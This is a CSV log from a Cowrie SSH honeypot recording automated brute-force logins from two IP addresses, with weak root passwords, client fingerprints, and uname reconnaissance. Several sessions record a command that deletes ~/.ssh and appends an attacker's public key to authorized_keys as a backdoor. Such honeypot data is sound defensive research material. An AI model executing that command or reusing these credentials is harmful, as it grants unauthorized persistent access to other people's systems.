eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.session.connect,52.165.31.201,27910,172.233.154.19,2222,bdbb25ae9136,ssh,,,,New connection: 52.165.31.201:27910 (172.233.154.19:2222) [session: bdbb25ae9136],localhost,2024-11-29T06:53:24.320085Z
cowrie.client.version,52.165.31.201,,,,bdbb25ae9136,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:53:24.339784Z
cowrie.client.kex,52.165.31.201,,,,bdbb25ae9136,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:53:24.390346Z
cowrie.login.success,52.165.31.201,,,,bdbb25ae9136,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T06:53:24.666364Z
cowrie.session.closed,52.165.31.201,,,,9e1b73bf035f,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:53:24.729572Z
cowrie.session.closed,52.165.31.201,,,,bdbb25ae9136,,,,,Connection lost after 0 seconds,localhost,2024-11-29T06:53:24.730117Z
cowrie.session.connect,62.60.152.146,55010,172.233.154.19,2222,2dc21570ce68,ssh,,,,New connection: 62.60.152.146:55010 (172.233.154.19:2222) [session: 2dc21570ce68],localhost,2024-11-29T06:53:51.953584Z
cowrie.client.version,62.60.152.146,,,,2dc21570ce68,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:53:51.958458Z
cowrie.client.kex,62.60.152.146,,,,2dc21570ce68,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:53:52.148030Z
cowrie.login.failed,62.60.152.146,,,,2dc21570ce68,,,,,login attempt [ubuntu/123456] failed,localhost,2024-11-29T06:53:52.937048Z
cowrie.session.closed,62.60.152.146,,,,2dc21570ce68,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:53:54.132950Z
cowrie.session.connect,62.60.152.146,57312,172.233.154.19,2222,f862338d1013,ssh,,,,New connection: 62.60.152.146:57312 (172.233.154.19:2222) [session: f862338d1013],localhost,2024-11-29T06:54:20.924570Z
cowrie.client.version,62.60.152.146,,,,f862338d1013,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:54:20.925368Z
cowrie.client.kex,62.60.152.146,,,,f862338d1013,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:54:21.105976Z
cowrie.login.success,62.60.152.146,,,,f862338d1013,,,,,login attempt [root/QQ123456] succeeded,localhost,2024-11-29T06:54:21.847672Z
cowrie.session.params,62.60.152.146,,,,f862338d1013,,,,,[],localhost,2024-11-29T06:54:22.234700Z
cowrie.command.input,62.60.152.146,,,,f862338d1013,,,,,CMD: uname -s -v -n -r -m,localhost,2024-11-29T06:54:22.235067Z
cowrie.log.closed,62.60.152.146,,,,f862338d1013,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-11-29T06:54:22.418087Z
cowrie.session.closed,62.60.152.146,,,,f862338d1013,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:54:22.418983Z
cowrie.session.connect,52.165.31.201,13102,172.233.154.19,2222,4d1be27b3b85,ssh,,,,New connection: 52.165.31.201:13102 (172.233.154.19:2222) [session: 4d1be27b3b85],localhost,2024-11-29T06:54:47.276542Z
cowrie.client.version,52.165.31.201,,,,4d1be27b3b85,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:54:47.286452Z
cowrie.client.kex,52.165.31.201,,,,4d1be27b3b85,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:54:47.337604Z
cowrie.login.success,52.165.31.201,,,,4d1be27b3b85,,,,,login attempt [root/zxc12345] succeeded,localhost,2024-11-29T06:54:47.551847Z
cowrie.session.params,52.165.31.201,,,,4d1be27b3b85,,,,,[],localhost,2024-11-29T06:54:47.666640Z
cowrie.command.input,52.165.31.201,,,,4d1be27b3b85,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T06:54:47.667003Z
cowrie.command.failed,52.165.31.201,,,,4d1be27b3b85,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T06:54:47.667632Z
cowrie.log.closed,52.165.31.201,,,,4d1be27b3b85,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T06:54:47.848293Z
cowrie.session.params,52.165.31.201,,,,4d1be27b3b85,,,,,[],localhost,2024-11-29T06:54:47.927530Z
cowrie.command.input,52.165.31.201,,,,4d1be27b3b85,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T06:54:47.927896Z
cowrie.session.file_download,52.165.31.201,,,,4d1be27b3b85,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T06:54:47.984319Z
cowrie.log.closed,52.165.31.201,,,,4d1be27b3b85,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T06:54:47.984994Z
cowrie.session.connect,52.165.31.201,23292,172.233.154.19,2222,4c24c7c835de,ssh,,,,New connection: 52.165.31.201:23292 (172.233.154.19:2222) [session: 4c24c7c835de],localhost,2024-11-29T06:54:48.136063Z
cowrie.client.version,52.165.31.201,,,,4c24c7c835de,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:54:48.140952Z
cowrie.client.kex,52.165.31.201,,,,4c24c7c835de,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:54:48.200195Z
cowrie.login.failed,52.165.31.201,,,,4c24c7c835de,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T06:54:48.433694Z
cowrie.session.closed,52.165.31.201,,,,4c24c7c835de,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:54:49.501621Z
cowrie.session.connect,52.165.31.201,64769,172.233.154.19,2222,82bf3ef04064,ssh,,,,New connection: 52.165.31.201:64769 (172.233.154.19:2222) [session: 82bf3ef04064],localhost,2024-11-29T06:54:49.550793Z
cowrie.client.version,52.165.31.201,,,,82bf3ef04064,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:54:49.572288Z
cowrie.client.kex,52.165.31.201,,,,82bf3ef04064,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:54:49.627473Z
cowrie.login.success,52.165.31.201,,,,82bf3ef04064,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T06:54:49.893839Z
cowrie.session.closed,52.165.31.201,,,,4d1be27b3b85,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:54:49.951603Z
cowrie.session.closed,52.165.31.201,,,,82bf3ef04064,,,,,Connection lost after 0 seconds,localhost,2024-11-29T06:54:49.952403Z
cowrie.session.connect,62.60.152.146,44536,172.233.154.19,2222,e8ea6b9e1a98,ssh,,,,New connection: 62.60.152.146:44536 (172.233.154.19:2222) [session: e8ea6b9e1a98],localhost,2024-11-29T06:55:00.510092Z
cowrie.client.version,62.60.152.146,,,,e8ea6b9e1a98,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:55:00.510717Z
cowrie.client.kex,62.60.152.146,,,,e8ea6b9e1a98,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:55:00.707537Z
cowrie.login.failed,62.60.152.146,,,,e8ea6b9e1a98,,,,,login attempt [deploy/deploy123] failed,localhost,2024-11-29T06:55:01.370742Z
cowrie.session.closed,62.60.152.146,,,,e8ea6b9e1a98,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:55:02.577094Z
cowrie.session.connect,62.60.152.146,33632,172.233.154.19,2222,013883e34a2e,ssh,,,,New connection: 62.60.152.146:33632 (172.233.154.19:2222) [session: 013883e34a2e],localhost,2024-11-29T06:55:31.599153Z
cowrie.client.version,62.60.152.146,,,,013883e34a2e,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:55:31.608668Z
cowrie.client.kex,62.60.152.146,,,,013883e34a2e,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:55:31.798681Z
cowrie.login.success,62.60.152.146,,,,013883e34a2e,,,,,login attempt [root/qwerty] succeeded,localhost,2024-11-29T06:55:32.560393Z
cowrie.session.params,62.60.152.146,,,,013883e34a2e,,,,,[],localhost,2024-11-29T06:55:32.948426Z
cowrie.command.input,62.60.152.146,,,,013883e34a2e,,,,,CMD: uname -s -v -n -r -m,localhost,2024-11-29T06:55:32.948775Z
cowrie.log.closed,62.60.152.146,,,,013883e34a2e,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-11-29T06:55:33.137223Z
cowrie.session.closed,62.60.152.146,,,,013883e34a2e,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:55:33.137895Z
cowrie.session.connect,62.60.152.146,37926,172.233.154.19,2222,066b398ea131,ssh,,,,New connection: 62.60.152.146:37926 (172.233.154.19:2222) [session: 066b398ea131],localhost,2024-11-29T06:55:44.784422Z
cowrie.client.version,62.60.152.146,,,,066b398ea131,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:55:44.836583Z
cowrie.client.kex,62.60.152.146,,,,066b398ea131,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:55:44.963842Z
cowrie.login.failed,62.60.152.146,,,,066b398ea131,,,,,login attempt [oracle/123qwe] failed,localhost,2024-11-29T06:55:45.659343Z
cowrie.session.closed,62.60.152.146,,,,066b398ea131,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:55:46.839616Z
cowrie.session.connect,52.165.31.201,60266,172.233.154.19,2222,049702d17d64,ssh,,,,New connection: 52.165.31.201:60266 (172.233.154.19:2222) [session: 049702d17d64],localhost,2024-11-29T06:56:13.445321Z
cowrie.client.version,52.165.31.201,,,,049702d17d64,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:56:13.452197Z
cowrie.client.kex,52.165.31.201,,,,049702d17d64,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:56:13.502069Z
cowrie.login.success,52.165.31.201,,,,049702d17d64,,,,,login attempt [root/wsx123] succeeded,localhost,2024-11-29T06:56:13.726193Z
cowrie.session.params,52.165.31.201,,,,049702d17d64,,,,,[],localhost,2024-11-29T06:56:13.864453Z
cowrie.command.input,52.165.31.201,,,,049702d17d64,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T06:56:13.864798Z
cowrie.command.failed,52.165.31.201,,,,049702d17d64,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T06:56:13.865434Z
cowrie.log.closed,52.165.31.201,,,,049702d17d64,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T06:56:14.015276Z
cowrie.session.params,52.165.31.201,,,,049702d17d64,,,,,[],localhost,2024-11-29T06:56:14.120442Z
cowrie.command.input,52.165.31.201,,,,049702d17d64,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T06:56:14.120787Z
cowrie.session.file_download,52.165.31.201,,,,049702d17d64,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T06:56:14.173539Z
cowrie.log.closed,52.165.31.201,,,,049702d17d64,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T06:56:14.173972Z
cowrie.session.connect,52.165.31.201,8703,172.233.154.19,2222,8dc27a531290,ssh,,,,New connection: 52.165.31.201:8703 (172.233.154.19:2222) [session: 8dc27a531290],localhost,2024-11-29T06:56:14.229505Z
cowrie.client.version,52.165.31.201,,,,8dc27a531290,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:56:14.230951Z
cowrie.client.kex,52.165.31.201,,,,8dc27a531290,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:56:14.299718Z
cowrie.login.failed,52.165.31.201,,,,8dc27a531290,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T06:56:14.588418Z
cowrie.session.closed,52.165.31.201,,,,8dc27a531290,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:56:15.663301Z
cowrie.session.connect,52.165.31.201,28351,172.233.154.19,2222,5fb6254f89a6,ssh,,,,New connection: 52.165.31.201:28351 (172.233.154.19:2222) [session: 5fb6254f89a6],localhost,2024-11-29T06:56:15.715254Z
cowrie.client.version,52.165.31.201,,,,5fb6254f89a6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:56:15.719029Z
cowrie.client.kex,52.165.31.201,,,,5fb6254f89a6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:56:15.778011Z
cowrie.login.success,52.165.31.201,,,,5fb6254f89a6,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T06:56:16.021954Z
cowrie.session.closed,52.165.31.201,,,,5fb6254f89a6,,,,,Connection lost after 0 seconds,localhost,2024-11-29T06:56:16.080188Z
cowrie.session.closed,52.165.31.201,,,,049702d17d64,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:56:16.080636Z
cowrie.session.connect,62.60.152.146,58482,172.233.154.19,2222,dd50e4022b20,ssh,,,,New connection: 62.60.152.146:58482 (172.233.154.19:2222) [session: dd50e4022b20],localhost,2024-11-29T06:56:29.560209Z
cowrie.client.version,62.60.152.146,,,,dd50e4022b20,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:56:29.560759Z
cowrie.client.kex,62.60.152.146,,,,dd50e4022b20,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:56:29.731116Z
cowrie.login.success,62.60.152.146,,,,dd50e4022b20,,,,,login attempt [root/1q2w3e4r] succeeded,localhost,2024-11-29T06:56:30.270584Z
cowrie.session.params,62.60.152.146,,,,dd50e4022b20,,,,,[],localhost,2024-11-29T06:56:30.631165Z
cowrie.command.input,62.60.152.146,,,,dd50e4022b20,,,,,CMD: uname -s -v -n -r -m,localhost,2024-11-29T06:56:30.631522Z
cowrie.log.closed,62.60.152.146,,,,dd50e4022b20,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-11-29T06:56:30.805819Z
cowrie.session.closed,62.60.152.146,,,,dd50e4022b20,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:56:30.807781Z
cowrie.session.connect,62.60.152.146,50930,172.233.154.19,2222,4d2ba610fdd2,ssh,,,,New connection: 62.60.152.146:50930 (172.233.154.19:2222) [session: 4d2ba610fdd2],localhost,2024-11-29T06:57:01.881617Z
cowrie.client.version,62.60.152.146,,,,4d2ba610fdd2,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:57:01.882476Z
cowrie.client.kex,62.60.152.146,,,,4d2ba610fdd2,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:57:02.108331Z
cowrie.login.success,62.60.152.146,,,,4d2ba610fdd2,,,,,login attempt [root/111111] succeeded,localhost,2024-11-29T06:57:02.670117Z
cowrie.session.params,62.60.152.146,,,,4d2ba610fdd2,,,,,[],localhost,2024-11-29T06:57:03.027282Z
cowrie.command.input,62.60.152.146,,,,4d2ba610fdd2,,,,,CMD: uname -s -v -n -r -m,localhost,2024-11-29T06:57:03.027663Z
